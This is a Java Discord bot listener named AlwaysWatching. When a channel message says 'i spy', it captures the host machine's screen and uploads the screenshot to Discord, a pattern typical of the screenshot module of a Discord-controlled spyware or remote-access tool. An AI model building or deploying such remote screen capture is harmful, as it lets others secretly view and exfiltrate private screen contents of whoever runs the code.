package commands;

import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.entities.MessageChannel;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import screenshot.Screenshot;

import java.awt.*;
import java.io.File;

public class AlwaysWatching extends ListenerAdapter {

    private Screenshot ss;

    @Override
    public void onMessageReceived(MessageReceivedEvent event)
    {
        MessageChannel channel = event.getChannel();
        if (event.getMessage().getContentRaw().equalsIgnoreCase("i spy")) {
            ss = new Screenshot();
            channel.sendMessage("i spy")
                    .addFile(new File(ss.getScreenshotPath()))
                    .setEmbeds(new EmbedBuilder()
                            .setImage("attachment://" + ss.getScreenshotName())
                            .build())
                    .queue(); // this actually sends the information to discord
        }
        if(event.getMessage().getContentRaw().equalsIgnoreCase("i stop")) {
            event.getChannel().sendMessage("i stop").queue();
        }
    }
}